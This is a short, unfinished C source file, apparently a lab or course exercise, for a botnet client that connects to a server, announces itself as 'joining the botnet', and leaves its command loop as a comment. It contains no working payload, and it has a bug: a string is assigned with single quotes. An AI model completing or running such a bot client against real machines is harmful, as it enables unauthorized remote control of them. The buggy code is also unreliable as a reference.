#include "utils.h"
#include "macros.h"
#include "connect.h"

int main(void) {


	char* name = '10.0.2.8'; //Get the client's username and store it in name, it is the IP address
	int channel = init_socket(SERVER, PORT, name);//initiate a channel given SERVER, PORT, and name;
	//Allocate stack space of size CMD_LENGTH to hold data of type char. Call the stack pointer msg
	char stack[CMD_LENGTH];
	char msg[CMD_LENGTH]; // This would be the stack pointer msg??

	printf("%s joining the botnet\n", name);


	/*Infinite Loop {
	  recieve(...);
	  parse(...);
	} */

}
